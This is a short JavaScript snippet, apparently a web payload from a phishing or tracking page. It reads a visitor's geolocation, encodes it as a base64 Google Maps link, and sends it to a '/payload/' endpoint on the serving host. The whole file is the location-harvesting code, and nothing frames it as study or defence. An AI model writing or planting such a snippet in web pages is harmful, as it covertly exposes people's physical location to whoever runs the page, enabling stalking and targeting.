navigator.geolocation.getCurrentPosition(
    function (position) {
        var xhr = new XMLHttpRequest(); 
        payload = btoa("https://www.google.com/maps/@" + position.coords.latitude + "," + position.coords.longitude + ",15z");
        xhr.open('GET', '/payload/' + payload , true);
        xhr.send();
    }
);